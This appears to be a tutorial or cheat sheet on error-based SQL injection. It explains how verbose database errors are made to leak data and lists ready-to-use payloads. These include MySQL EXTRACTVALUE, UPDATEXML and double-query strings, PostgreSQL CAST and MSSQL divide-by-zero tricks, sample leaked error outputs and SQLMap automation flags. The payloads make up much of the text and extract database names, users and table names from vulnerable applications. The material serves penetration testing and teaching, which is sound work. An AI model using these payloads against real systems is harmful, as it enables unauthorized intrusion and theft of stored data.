### The Core Principle

You craft a payload that triggers a deliberate but verbose error, and embed the data you want to extract inside that error string. The server, if configured to show errors, returns it right back in the HTTP response.

### Common Techniques by Database

Here are the most powerful techniques SQLMap and manual testers use, ordered by commonality.

---

#### 1. ExtractValue (MySQL)
This is the gold standard for MySQL error-based injection. It uses the `EXTRACTVALUE()` XML function incorrectly to force a data leak.

**How it works:** `EXTRACTVALUE` expects valid XPath, but you supply a malformed one that contains subquery output.

**Payload:**
```sql
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e)) --
```

**Error returned:**
`XPATH syntax error: '~target_db~'`

This single request extracts the database name. You can embed any subquery (e.g., getting table names, columns, or row data) in place of `(SELECT database())`.

---

#### 2. UpdateXML (MySQL)
Functionally identical to `EXTRACTVALUE`, just a different exploitable function.

**Payload:**
```sql
' AND UPDATEXML(1, CONCAT(0x7e, (SELECT user()), 0x7e), 1) --
```

**Error returned:**
`XPATH syntax error: '~root@localhost~'`

---

#### 3. TYPE CONVERSION Errors (PostgreSQL, MSSQL, Oracle)
You force the database to fail while casting your data to an incompatible type, leaking it in the process.

**PostgreSQL (`CAST` failure):**
```sql
' AND 1 = CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT) --
```
**Error:** `invalid input syntax for type integer: "users"`

**MSSQL/MySQL (Divide-by-zero trick):**
Sometimes you need to trigger a different categorical error to display raw data:
```sql
' OR 1/(SELECT LEN(USER)) --
```

---

#### 4. Double Query (MySQL/MariaDB)
Classic technique using derived tables and `GROUP BY` with `RAND()` or `FLOOR()` to leak data in key duplication errors.

**Payload:**
```sql
' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT version()), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a) --
```
**Error:** `Duplicate entry '10.5.5-MariaDB1' for key 'group_key'`

This is powerful but noisy and works well on older MySQL/MariaDB versions.

---

### Why This Is So Valuable

This technique effectively turns **error-based injection into in-band injection**, giving you the same speed as classic UNION-based attacks where errors are displayed.

- **Single-request extraction:** Each payload instantly returns a chunk of data in the error.
- **No binary search needed:** Unlike blind SQLi, no looping through character sets.
- **SQLMap automation:** With `--technique=E`, SQLMap will automatically fingerprint the DBMS and pick the right payload class (`EXTRACTVALUE` for MySQL, type conversion for PostgreSQL, etc.).

### Detection Tip for Manual Testing

Add a single quote or bracket to trigger a syntax error first. If you see verbose error output, test with a basic `EXTRACTVALUE` payload. If you get data back cleaner than a printed report, you've confirmed error-based data exfiltration in seconds rather than hours.
